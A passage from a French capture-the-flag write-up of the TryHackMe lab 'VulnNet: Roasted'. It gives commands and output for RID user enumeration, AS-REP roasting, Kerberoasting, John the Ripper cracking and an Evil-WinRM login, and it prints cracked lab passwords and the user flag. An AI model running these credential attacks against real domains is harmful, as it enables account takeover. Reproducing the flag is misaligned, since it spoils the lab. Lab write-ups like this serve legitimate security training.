+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">512: VULNNET-RST&lt;span class="se">\D&lt;/span>omain Admins &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">513: VULNNET-RST&lt;span class="se">\D&lt;/span>omain Users &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">514: VULNNET-RST&lt;span class="se">\D&lt;/span>omain Guests &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">515: VULNNET-RST&lt;span class="se">\D&lt;/span>omain Computers &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">516: VULNNET-RST&lt;span class="se">\D&lt;/span>omain Controllers &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">517: VULNNET-RST&lt;span class="se">\C&lt;/span>ert Publishers &lt;span class="o">(&lt;/span>SidTypeAlias&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">518: VULNNET-RST&lt;span class="se">\S&lt;/span>chema Admins &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">519: VULNNET-RST&lt;span class="se">\E&lt;/span>nterprise Admins &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">520: VULNNET-RST&lt;span class="se">\G&lt;/span>roup Policy Creator Owners &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">521: VULNNET-RST&lt;span class="se">\R&lt;/span>ead-only Domain Controllers &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">522: VULNNET-RST&lt;span class="se">\C&lt;/span>loneable Domain Controllers &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">525: VULNNET-RST&lt;span class="se">\P&lt;/span>rotected Users &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">526: VULNNET-RST&lt;span class="se">\K&lt;/span>ey Admins &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">527: VULNNET-RST&lt;span class="se">\E&lt;/span>nterprise Key Admins &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">553: VULNNET-RST&lt;span class="se">\R&lt;/span>AS and IAS Servers &lt;span class="o">(&lt;/span>SidTypeAlias&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">571: VULNNET-RST&lt;span class="se">\A&lt;/span>llowed RODC Password Replication Group &lt;span class="o">(&lt;/span>SidTypeAlias&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">572: VULNNET-RST&lt;span class="se">\D&lt;/span>enied RODC Password Replication Group &lt;span class="o">(&lt;/span>SidTypeAlias&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1000: VULNNET-RST&lt;span class="se">\W&lt;/span>IN-2BO8M1OE1M1$ &lt;span class="o">(&lt;/span>SidTypeUser&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1101: VULNNET-RST&lt;span class="se">\D&lt;/span>nsAdmins &lt;span class="o">(&lt;/span>SidTypeAlias&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1102: VULNNET-RST&lt;span class="se">\D&lt;/span>nsUpdateProxy &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1104: VULNNET-RST&lt;span class="se">\e&lt;/span>nterprise-core-vn &lt;span class="o">(&lt;/span>SidTypeUser&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1105: VULNNET-RST&lt;span class="se">\a&lt;/span>-whitehat &lt;span class="o">(&lt;/span>SidTypeUser&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1109: VULNNET-RST&lt;span class="se">\t&lt;/span>-skid &lt;span class="o">(&lt;/span>SidTypeUser&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1110: VULNNET-RST&lt;span class="se">\j&lt;/span>-goldenhand &lt;span class="o">(&lt;/span>SidTypeUser&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1111: VULNNET-RST&lt;span class="se">\j&lt;/span>-leet &lt;span class="o">(&lt;/span>SidTypeUser&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>BINGO ! On a des utilisateurs:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>a-whitehat&lt;/strong>&lt;/li>
+&lt;li>&lt;strong>enterprise-core-vn&lt;/strong>&lt;/li>
+&lt;li>&lt;strong>j-goldenhand&lt;/strong>&lt;/li>
+&lt;li>&lt;strong>j-leet&lt;/strong>&lt;/li>
+&lt;li>&lt;strong>t-skid&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;h3 id="exploitation">
+&lt;a href="#exploitation">#&lt;/a>
+Exploitation
+&lt;/h3>&lt;h4 id="as-rep-roasting">
+&lt;a href="#as-rep-roasting">#&lt;/a>
+As-Rep Roasting
+&lt;/h4>&lt;p>C&amp;rsquo;est quoi l&amp;rsquo;As-Rep Roasting ?&lt;/p>
+&lt;p>L&amp;rsquo;attaque AS-REP Roasting est une attaque contre les comptes Active Directory qui n&amp;rsquo;ont pas l&amp;rsquo;attribut UF_DONT_REQUIRE_PREAUTH défini. L&amp;rsquo;attaque consiste à envoyer une demande de ticket Kerberos pour un utilisateur qui n&amp;rsquo;a pas l&amp;rsquo;attribut UF_DONT_REQUIRE_PREAUTH défini. L&amp;rsquo;attaque est appelée &amp;ldquo;roasting&amp;rdquo; car l&amp;rsquo;attaquant peut récupérer le hash du mot de passe de l&amp;rsquo;utilisateur sans avoir besoin de déchiffrer le trafic réseau.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 11:52:48 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip &amp;#34;10.10.211.33&amp;#34; &amp;#34;vulnnet-rst.local&amp;#34;/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket &lt;span class="k">for&lt;/span> Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright &lt;span class="m">2022&lt;/span> Fortra - forked by ThePorgs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User a-whitehat doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User enterprise-core-vn doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User j-goldenhand doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User j-leet doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$krb5asrep$23$t&lt;/span>-skid@VULNNET-RST.LOCAL:02349b9312c22cce838b122bbb4e6576&lt;span class="nv">$247&lt;/span>f0fe80f8d9c3ced75694bf421006a815c89b6f98382b865582e42d4e4c248b36130f42f68de4c914c908c8c9adef2dc8173e8090d25b7bfec3bec292f64dd1ed1514415075d07399f13c3ca287be9c99e6b2a668fbfda658621cdb6ec13a81334e7acd95d261335b1f8454b1e8ab7f57996810fd98dbb65feeb0f706bf9652c8e304098ba05dc2fcb750b19487a66ea3689f67b1196efa17da808124ad220c623c2eb0f77d54e9304f3fb3346099e5f9e7d8fed0f3c5247d20d258dc25c8eb4455a6513b01399cfd6e7f24f332a9438b26fc6222977738773fcfeff4c63566f850dca6fc6cc72fd1df73d9e835d5218d63d615e19
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>On a récupéré le hash du mot de passe de l&amp;rsquo;utilisateur &lt;strong>t-skid&lt;/strong>.&lt;/p>
+&lt;h4 id="cracking">
+&lt;a href="#cracking">#&lt;/a>
+Cracking
+&lt;/h4>&lt;p>On peut maintenant cracker le hash récupéré avec John The Ripper:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 11:54:10 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># john --wordlist=`fzf-wordlists` ASREProastables.txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using default input encoding: UTF-8
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Loaded &lt;span class="m">1&lt;/span> password &lt;span class="nb">hash&lt;/span> &lt;span class="o">(&lt;/span>krb5asrep, Kerberos &lt;span class="m">5&lt;/span> AS-REP etype 17/18/23 &lt;span class="o">[&lt;/span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x&lt;span class="o">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>etype&lt;span class="o">)&lt;/span> is &lt;span class="m">23&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Will run &lt;span class="m">8&lt;/span> OpenMP threads
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Press &lt;span class="s1">&amp;#39;q&amp;#39;&lt;/span> or Ctrl-C to abort, &lt;span class="s1">&amp;#39;h&amp;#39;&lt;/span> &lt;span class="k">for&lt;/span> help, almost any other key &lt;span class="k">for&lt;/span> status
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tj072889* &lt;span class="o">(&lt;/span>&lt;span class="nv">$krb5asrep$23$t&lt;/span>-skid@VULNNET-RST.LOCAL&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1g 0:00:00:01 DONE &lt;span class="o">(&lt;/span>2024-05-12 11:54&lt;span class="o">)&lt;/span> 0.6803g/s 2184Kp/s 2184Kc/s 2184KC/s tomaatjuh..tigris@livs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Use the &lt;span class="s2">&amp;#34;--show&amp;#34;&lt;/span> option to display all of the cracked passwords reliably
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Session completed.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Le mot de passe de l&amp;rsquo;utilisateur &lt;strong>t-skid&lt;/strong> est &lt;strong>tj072889&lt;/strong>.&lt;/p>
+&lt;h4 id="kerberoasting">
+&lt;a href="#kerberoasting">#&lt;/a>
+Kerberoasting
+&lt;/h4>&lt;p>C&amp;rsquo;est quoi le Kerberoasting ?&lt;/p>
+&lt;p>L&amp;rsquo;attaque Kerberoasting est une attaque contre les comptes Active Directory qui ont l&amp;rsquo;attribut servicePrincipalName défini. L&amp;rsquo;attaque consiste à envoyer une demande de ticket Kerberos pour un utilisateur qui a l&amp;rsquo;attribut servicePrincipalName défini. L&amp;rsquo;attaque est appelée &amp;ldquo;roasting&amp;rdquo; car l&amp;rsquo;attaquant peut récupérer le hash du mot de passe de l&amp;rsquo;utilisateur sans avoir besoin de déchiffrer le trafic réseau.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 12:03:25 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># GetUserSPNs.py &amp;#39;VULNNET-RST.local/t-skid:tj072889*&amp;#39; -outputfile hashes -dc-ip 10.10.211.33&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket &lt;span class="k">for&lt;/span> Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright &lt;span class="m">2022&lt;/span> Fortra - forked by ThePorgs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---------------------- ------------------ ------------------------------------------------------------- -------------------------- -------------------------- ----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CIFS/vulnnet-rst.local enterprise-core-vn &lt;span class="nv">CN&lt;/span>&lt;span class="o">=&lt;/span>Remote Management Users,CN&lt;span class="o">=&lt;/span>Builtin,DC&lt;span class="o">=&lt;/span>vulnnet-rst,DC&lt;span class="o">=&lt;/span>&lt;span class="nb">local&lt;/span> 2021-03-11 19:45:09.913979 2021-03-13 23:41:17.987528
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> CCache file is not found. Skipping...
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>On a récupéré le hash du mot de passe de l&amp;rsquo;utilisateur &lt;strong>enterprise-core-vn&lt;/strong>.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 12:03:42 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># cat hashes&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$krb5tgs$23$*&lt;/span>enterprise-core-vn&lt;span class="nv">$VULNNET&lt;/span>-RST.LOCAL&lt;span class="nv">$VULNNET&lt;/span>-RST.local/enterprise-core-vn*&lt;span class="nv">$964&lt;/span>e72ce6bca5255ff16822ec093621b&lt;span class="nv">$f4205c6f1560b7ccf8e41ea21919930a479b710eba5871ea2c2cae415115692801ce950513bfd01c8042faa4cdbe9cf01abfd13d8d593b6cf0125697dc69a482595497675584e7056b02ae92b49fe416a490103307191c092784c56c72ca18dedd843cd1568f085eaef37e4d107b346c6d4d03c9fc1e7c9b5c03f50d757a34d94f370b51fc841e61737520afd60eb4c2f94fde83c3e3773b1a4620051521c3045ea80c76181e2feb164c52bc6b8e8b5c20beb6cca6d7c12db081bf451c78f29ec884489ba4b58173877db82e862d1a1d2bf26f158f0d9c33badd596f181f37314beffefa60bd29f4da41aac80ff56f3eae5de78036f94aa552d91974c106c8609bc80cc81d5794172cd3bc56bb4da847d13cd320dd93343cb4743ab9f0907e79dea28fe5de0d9fb4fc0ea89dc514dd0b6d19915714b5b4d44cefaf859dd0afdcc1b6b11a666ecdc0a84c35d8116821570921f5ce236bba8225d77c52c0c06fab5c0dc5437cea9094af4cc37a550ecfdc4cb022589396f4cfdc7d3b559646b14a379df69656cd11213a155d95f47a220715c11061a3af33b81dfa836a3a7553874a5a936bea2dc9a284bcf2fcb5c582877dc9976d5d2d29ebbf84ea8853dc413512eb7d1dcf47b68b6ad17705b0b732c449ca9c4bb8801b63e90c825da161c0365211b4d4f54a6126b838f362c9b3d9ee234bb794021e6bf9645ff3ca0768885586d966d10ad540cffe06d18e617990a9b9f63c20c252cae2af2570e9a369d14debbcda58b768d274be8d3710c3fc8d497bfca1553fedf2017cfbf4808ac80a8a1b49961131af64dcb21ab0dfeb1b89b331b17e0349984a875039baf81cc1cc8e4d015c503ccc7065851b073ff1191413b763162bcca1588d1fca4db8830542eed9b561d376194183d078035ce74125b10c85841043cff5c2302965e55004810ca63d11260bab81ddc0456be7b2278b655dfd59683893dccdfc024c9cc0acb819dcf9f0cbafa29e8b22213a243451cfe902bf4051bd862ea80620c002502c9744dd143b11336782d9a2b815b17245faca22653b03c6367a9a36b22b312ba51e5e7bf1ef780a88d9e4c9f8bdf3ac58251c0199ff1dab58db3512c68a3ee3487f8142290f9ae2a9fc8d24faeadf204a8059f65288e929f78f09a57e8af2b2f2e0f13d222c339c58a23a5bbbca580a88d80c9055e2b39d7263e67ee16754fa788b3cca777354ccace352a664f45949aebf8492eb5996e765bbb266f418921e06a37bbcd234d2263999f9e029195bfe73421c1834f608d6f0efae2924478a8648a4c2d9af8481274e60f824c9ed022c501bf4e907c2318f88cf6119c8e15c205f51e283556aae05b2078411102b01e7d05fb09934d3c394846fcb03ceb730f4&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="cracking-1">
+&lt;a href="#cracking-1">#&lt;/a>
+Cracking
+&lt;/h4>&lt;p>On peut maintenant cracker le hash récupéré avec John The Ripper:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 12:03:49 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># john --wordlist=`fzf-wordlists` hashes&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using default input encoding: UTF-8
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Loaded &lt;span class="m">1&lt;/span> password &lt;span class="nb">hash&lt;/span> &lt;span class="o">(&lt;/span>krb5tgs, Kerberos &lt;span class="m">5&lt;/span> TGS-REP etype &lt;span class="m">23&lt;/span> &lt;span class="o">[&lt;/span>MD4 HMAC-MD5 RC4&lt;span class="o">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Will run &lt;span class="m">8&lt;/span> OpenMP threads
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Press &lt;span class="s1">&amp;#39;q&amp;#39;&lt;/span> or Ctrl-C to abort, &lt;span class="s1">&amp;#39;h&amp;#39;&lt;/span> &lt;span class="k">for&lt;/span> help, almost any other key &lt;span class="k">for&lt;/span> status
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">ry&lt;/span>&lt;span class="o">=&lt;/span>ibfkfv,s6h, &lt;span class="o">(&lt;/span>?&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1g 0:00:00:01 DONE &lt;span class="o">(&lt;/span>2024-05-12 12:04&lt;span class="o">)&lt;/span> 0.8621g/s 3559Kp/s 3559Kc/s 3559KC/s sadeceben123..ruddle
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Use the &lt;span class="s2">&amp;#34;--show&amp;#34;&lt;/span> option to display all of the cracked passwords reliably
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Session completed.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Parfait ! On a récupéré le mot de passe de l&amp;rsquo;utilisateur &lt;strong>enterprise-core-vn&lt;/strong> qui est &lt;strong>ry=ibfkfv,s6h,&lt;/strong>.&lt;/p>
+&lt;h4 id="evil-winrm">
+&lt;a href="#evil-winrm">#&lt;/a>
+Evil-WinRM
+&lt;/h4>&lt;p>Maintenant on peut se connecter à la machine avec Evil-WinRM:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 12:06:27 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># evil-winrm -i 10.10.211.33 -u &amp;#39;enterprise-core-vn&amp;#39; -p &amp;#39;ry=ibfkfv,s6h,&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Evil-WinRM shell v3.5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Info: Establishing connection to remote endpoint
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\e&lt;/span>nterprise-core-vn&lt;span class="se">\D&lt;/span>ocuments&amp;gt; dir
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\e&lt;/span>nterprise-core-vn&lt;span class="se">\D&lt;/span>ocuments&amp;gt; &lt;span class="nb">cd&lt;/span> ..
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\e&lt;/span>nterprise-core-vn&amp;gt; &lt;span class="nb">cd&lt;/span> &lt;span class="s2">&amp;#34;C:/Users/enterprise-core-vn/Desktop/&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\e&lt;/span>nterprise-core-vn&lt;span class="se">\D&lt;/span>esktop&amp;gt; &lt;span class="nb">type&lt;/span> &lt;span class="s2">&amp;#34;C:/Users/enterprise-core-vn/Desktop/user.txt&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">THM&lt;span class="o">{&lt;/span>726b7c0baaac1455d05c827b5561f4ed&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\e&lt;/span>nterprise-core-vn&lt;span class="se">\D&lt;/span>esktop&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>On a récupéré le flag utilisateur &lt;strong>THM{726b7c0baaac1455d05c827b5561f4ed}&lt;/strong>.&lt;/p>
+&lt;h3 id="escalade-de-privilèges">
+&lt;a href="#escalade-de-privil%c3%a8ges">#&lt;/a>
+Escalade de privilèges
+&lt;/h3>&lt;h4 id="smb">
+&lt;a href="#smb">#&lt;/a>
+SMB
+&lt;/h4>&lt;p>On peut maintenant regarder les partages SMB avec &lt;code>smbmap&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
